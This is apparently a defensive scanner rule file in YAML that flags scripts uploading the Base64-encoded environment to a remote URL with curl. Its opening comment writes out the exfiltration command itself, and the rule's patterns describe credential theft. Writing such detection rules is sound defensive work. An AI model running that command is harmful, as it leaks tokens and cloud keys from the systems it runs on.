# curl -d "$(env|base64)" https://host/ ships every environment variable,
# tokens and cloud keys included, in a single request. The encoding exists
# only to survive transport; no diagnostic needs the full dump off-host.
defaults:
  platforms: [unix]
  for: [scripts]
  attack: T1552.001,T1041

composite_rules:
  - id: encoded-environment-curl-upload
    desc: Uploads the Base64-encoded full environment to a remote URL with curl
    crit: hostile
    conf: 0.96
    near_bytes: 400
    all:
      - id: micro-behaviors/communications/http/request/credentials/environment::curl-body-encoded-environment
      - id: micro-behaviors/communications/http/curl/command::curl-command-remote-url
